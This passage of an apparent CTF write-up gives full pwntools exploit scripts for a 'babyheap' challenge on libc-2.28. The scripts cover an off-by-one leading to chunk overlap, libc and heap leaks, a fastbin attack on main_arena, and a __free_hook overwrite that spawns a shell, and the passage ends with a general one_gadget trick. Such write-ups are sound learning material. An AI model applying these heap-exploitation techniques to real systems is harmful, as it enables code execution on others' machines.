class="symbol">constraints:</span></span><br><span class="line">  [<span class="built_in">rsp</span>+<span class="number">0x70</span>] == NULL</span><br></pre></td></tr></table></figure></p>
<p>@Tac1t0rnX also conclude some workaround for this situation here: <a href="http://tacxingxing.com/2018/02/20/pwnabletw-secretgarden/" target="_blank" rel="noopener"><br>Pwnable.tw secretgarden
</a>, I first try to write <code>__malloc_hook</code> to <code>_libc_realloc+???</code> and <code>__realloc_hook</code> to <code>one_gadget</code>, but it also failed. So I have to turn to <code>__free_hook</code> trick, which overwrites top chunk to <code>__free_hook - 0xb58</code>, and allocate a bunch of junk chunk to reach <code>__free_hook</code>. To consume the top chunk and reach <code>__free_hook</code> buffer, we need to zero out the fastbin after each free. Here is my very first dirty exp used in the game.</p>
<h2 id="Exp-1"><a href="#Exp-1" class="headerlink" title="Exp #1"></a>Exp #1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">'./libc-2.28.so'</span>&#125;</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.28.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./babyheap1'</span>)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sea</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_addr</span><span class="params">(tag, addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">patten = re.compile(<span class="string">"Chunk (.*) Allocated"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    res = ru(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> int(patten.search(res).group(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_fastbin</span><span class="params">()</span>:</span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#0 stay     0x60  </span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#1 fastbin  0xc0    </span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#2 fastbin  0x120</span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#3 fastbin  0x180</span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#4 fastbin  0x1e0</span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#5 fastbin  0x240</span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#6 fastbin  0x2a0</span></span><br><span class="line">    alloc(<span class="number">0x58</span>) <span class="comment">#7 fastbin  0x300</span></span><br><span class="line">    <span class="comment"># prepare fake chunk c.prev_size = 0x200</span></span><br><span class="line">    update(<span class="number">6</span>, <span class="number">0x48</span>, <span class="string">'\x00'</span>*<span class="number">0x40</span>+p64(<span class="number">0x200</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strain_and_prepare</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># fill tcache to comsume top chunk size</span></span><br><span class="line">    <span class="keyword">for</span> size <span class="keyword">in</span> [<span class="number">0x58</span>, <span class="number">0x48</span>]:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">            _id = alloc(size)</span><br><span class="line">            update(_id, size, <span class="string">'a'</span>*size)</span><br><span class="line">            delete(_id)</span><br><span class="line"></span><br><span class="line">    prepare_fastbin()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># continue to fill tcache and waste top chunk</span></span><br><span class="line">    size = <span class="number">0x38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">        _id = alloc(size)</span><br><span class="line">        update(_id, size, <span class="string">'a'</span>*size)</span><br><span class="line">        delete(_id)</span><br><span class="line"></span><br><span class="line">    size = <span class="number">0x28</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">5</span>):</span><br><span class="line">        _id = alloc(size)</span><br><span class="line">        update(_id, size, <span class="string">'a'</span>*size)</span><br><span class="line">        delete(_id)</span><br><span class="line">    <span class="comment"># now top_chunk-&gt;size = 0x100</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># put them in fastbin to wait for consolidate</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">7</span>):</span><br><span class="line">            delete(i)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x48</span>)</span><br><span class="line">    alloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calloc will NOT get from tcache !!!</span></span><br><span class="line"><span class="comment"># we can only get it from fastbin !!!</span></span><br><span class="line"></span><br><span class="line">strain_and_prepare()</span><br><span class="line"><span class="comment"># now top_chunk-&gt;size = 0x60</span></span><br><span class="line"><span class="comment"># strain top_chunk size to trigger consolidate</span></span><br><span class="line">alloc(<span class="number">0x28</span>)</span><br><span class="line">alloc(<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># now #4(0x28) is at 0x87a0, a small bin (0x210) at 0x87c0</span></span><br><span class="line"><span class="comment"># we can off-by-one to set small bin chunk to 0x100.</span></span><br><span class="line">update(<span class="number">4</span>, <span class="number">0x28</span>, <span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x58</span>) <span class="comment">#5 fastbin</span></span><br><span class="line">alloc(<span class="number">0x58</span>) <span class="comment">#6 stay</span></span><br><span class="line">alloc(<span class="number">0x58</span>) <span class="comment">#7 stay</span></span><br><span class="line">alloc(<span class="number">0x58</span>) <span class="comment">#8 stay</span></span><br><span class="line">alloc(<span class="number">0x58</span>) <span class="comment">#9 stay</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># push in fastbin</span></span><br><span class="line">update(<span class="number">5</span>, <span class="number">0x51</span>, <span class="string">'a'</span>*<span class="number">0x50</span> + p8(<span class="number">0x60</span>))</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># consolidate</span></span><br><span class="line">alloc(<span class="number">0x30</span>)</span><br><span class="line"><span class="comment"># OVERLAP!!! now 6,7,8,9 in used but also in unsortbin</span></span><br><span class="line">victim = alloc(<span class="number">0x58</span>) <span class="comment">#7</span></span><br><span class="line"><span class="comment"># 6: 0x555555578830, 7: 0x555555578810 overlap</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">view(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">leak = ru(<span class="string">'\n'</span>)</span><br><span class="line">leak_libc = u64(leak[<span class="number">0x40</span>: <span class="number">0x48</span>])</span><br><span class="line">info_addr(<span class="string">'leak_libc'</span>, leak_libc)</span><br><span class="line">libc.address = leak_libc - <span class="number">0x1e4ca0</span></span><br><span class="line">info_addr(<span class="string">'libc'</span>, libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line"><span class="comment"># recover 6's header</span></span><br><span class="line">alloc(<span class="number">0x48</span>) <span class="comment">#11</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">11</span>)</span><br><span class="line">view(<span class="number">6</span>)</span><br><span class="line">ru(<span class="string">': '</span>)</span><br><span class="line">leak = ru(<span class="string">'\n'</span>)</span><br><span class="line">leak_heap = u64(leak[<span class="number">0x40</span>: <span class="number">0x48</span>])</span><br><span class="line">info_addr(<span class="string">'leak_heap'</span>, leak_heap)</span><br><span class="line">heap = leak_heap - <span class="number">0x1fce0</span></span><br><span class="line">info_addr(<span class="string">'heap'</span>, heap)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fastbin attack, get top_chunk at main_arena.</span></span><br><span class="line"><span class="comment"># to fake size in main arnea</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">arena_target = libc.address + <span class="number">0x1e4c6d</span></span><br><span class="line">update(<span class="number">6</span>, <span class="number">0x48</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span> + p64(<span class="number">0x51</span>) + p64(arena_target))</span><br><span class="line">t = alloc(<span class="number">0x48</span>) <span class="comment"># junk</span></span><br><span class="line">arena_buf = alloc(<span class="number">0x48</span>) </span><br><span class="line"></span><br><span class="line">delete(t)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">junk = alloc(<span class="number">0x28</span>)</span><br><span class="line">delete(junk)</span><br><span class="line">junk = alloc(<span class="number">0x28</span>)</span><br><span class="line">delete(junk)</span><br><span class="line">fb_handler = libc.address + <span class="number">0x1e4c55</span></span><br><span class="line">update(<span class="number">6</span>, <span class="number">0x48</span>, <span class="string">'\x00'</span>*<span class="number">0x38</span> + p64(<span class="number">0x51</span>) + p64(fb_handler))</span><br><span class="line">t = alloc(<span class="number">0x48</span>) <span class="comment"># junk</span></span><br><span class="line">fb_handler = alloc(<span class="number">0x48</span>) </span><br><span class="line">update(fb_handler, <span class="number">0x40</span>, <span class="string">'\x00'</span>*<span class="number">0x40</span>) <span class="comment"># clean bin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">main_arena = libc.address + <span class="number">0x1e4c40</span></span><br><span class="line">info_addr(<span class="string">"arena"</span>, main_arena)</span><br><span class="line"><span class="comment"># new_top = main_arena - 0x33 malloc_hook failed!</span></span><br><span class="line">free_hook = libc.address + <span class="number">0x1e68e8</span></span><br><span class="line">info_addr(<span class="string">"free_hook"</span>, free_hook)</span><br><span class="line">new_top = free_hook - <span class="number">0xb58</span> </span><br><span class="line">info_addr(<span class="string">"new top"</span>, new_top)</span><br><span class="line">update(arena_buf, <span class="number">43</span>, <span class="string">'\x00'</span>*<span class="number">35</span> + p64(new_top))</span><br><span class="line"></span><br><span class="line">one_gadget = libc.address + <span class="number">0x501e3</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x58</span>)</span><br><span class="line">alloc(<span class="number">0x58</span>)</span><br><span class="line">alloc(<span class="number">0x58</span>)</span><br><span class="line">junk = alloc(<span class="number">0x20</span>)</span><br><span class="line">delete(junk)</span><br><span class="line">junk = alloc(<span class="number">0x20</span>)</span><br><span class="line">delete(junk)</span><br><span class="line">junk = alloc(<span class="number">0x28</span>)</span><br><span class="line">delete(junk)</span><br><span class="line"></span><br><span class="line"><span class="comment"># to reach free_hook</span></span><br><span class="line">old = alloc(<span class="number">0x58</span>)</span><br><span class="line">new = alloc(<span class="number">0x58</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">29</span>):</span><br><span class="line">    delete(old)</span><br><span class="line">    update(fb_handler, <span class="number">0x30</span>, <span class="string">'\x00'</span>*<span class="number">0x30</span>) <span class="comment"># clean bin</span></span><br><span class="line">    old = new</span><br><span class="line">    new = alloc(<span class="number">0x58</span>)</span><br><span class="line"></span><br><span class="line">update(<span class="number">14</span>, <span class="number">0x10</span>, p64(<span class="number">0</span>) + p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line">update(<span class="number">0</span>, <span class="number">8</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="Better-solution"><a href="#Better-solution" class="headerlink" title="Better solution?"></a>Better solution?</h2><p>Actually, it wasted me a lot of time when debugging with the <code>__free_hook</code> trigger, so after the game, I wonder if there is any better way to call the one gadget? From the write up by r3kapig: <a href="https://gist.github.com/unamer/81b55e513d03f8c092d38f839bc0137a" target="_blank" rel="noopener">here</a>, I found they write <code>__malloc_hook</code> to <code>svc_run+0x38</code> and <code>__realloc_hook</code> to <code>one_gadget</code>. <code>svc_run+0x38</code> happen to be <code>call realloc</code>, with this additional call, it makes <code>[rsp+0x40]==0</code> at the one gadget point.</p>
<p><img src="https://i.loli.net/2019/03/28/5c9c2b34278e1.png" alt="svc_run"><span class="image-caption">svc_run</span></p>
<p>but it is still a coincidence, can we have something more general for similar situation? So I looked at every <code>call realloc</code> in libc-2.28.so, and finally found a perfect jump gadget. The gadget is at <code>0x105ae0</code>, which can help to set <code>[rsp+0x38]</code> to 0, and then <code>call realloc</code>, when the program hit our one gadget point, <code>[rsp+0x40]</code> is exactly where we set 0 before!<br>So next time when you meet the situation in libc-2.28, feel confident to set <code>__malloc_hook</code> to <code>libc+0x105ae0</code> and <code>__realloc_hook</code> to second <code>one gadget</code>.</p>
<p><img src="https://i.loli.net/2019/03/28/5c9c2e2704f7a.jpg" alt="gadget"><span class="image-caption">gadget</span></p>
<p>Here is my refined exp:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">'./libc-2.28.so'</span>&#125;</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.28.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    p = process(<span class="string">'./babyheap1'</span>)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recv(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">se</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.send(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendline(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sea</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sla</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.sendlineafter(a, b)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info_addr</span><span class="params">(tag, addr)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">patten = re.compile(<span class="string">"Chunk (.*) Allocated"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'1'</span>)</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    res = ru(<span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> int(patten.search(res).group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(idx, size, content)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'2'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line">    ru(<span class="string">'Size: '</span>)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(<span class="string">'Content: '</span>)</span><br><span class="line">    se(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'3'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">    ru(<span class="string">'Command: '</span>)</span><br><span class="line">    sl(<span class="string">'4'</span>)</span><br><span class="line">    ru(<span class="string">'Index: '</span>)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">prepare_fastbin</span><span class="params">()</span>:</span></span><br><span class="line">    a = alloc(<span class="number">0x58</span>) <span class="comment">#0 stay     0x60  </span></span><br><span class="line">    b1 = alloc(<span class="number">0x58</span>) <span class="comment">#1 fastbin  0xc0    </span></span><br><span class="line">    b2 = alloc(<span class="number">0x58</span>) <span class="comment">#2 fastbin  0x120</span></span><br><span class="line">    b3 = alloc(<span class="number">0x58</span>) <span class="comment">#3 fastbin  0x180</span></span><br><span class="line">    b4 = alloc(<span class="number">0x58</span>) <span class="comment">#4 fastbin  0x1e0</span></span><br><span class="line">   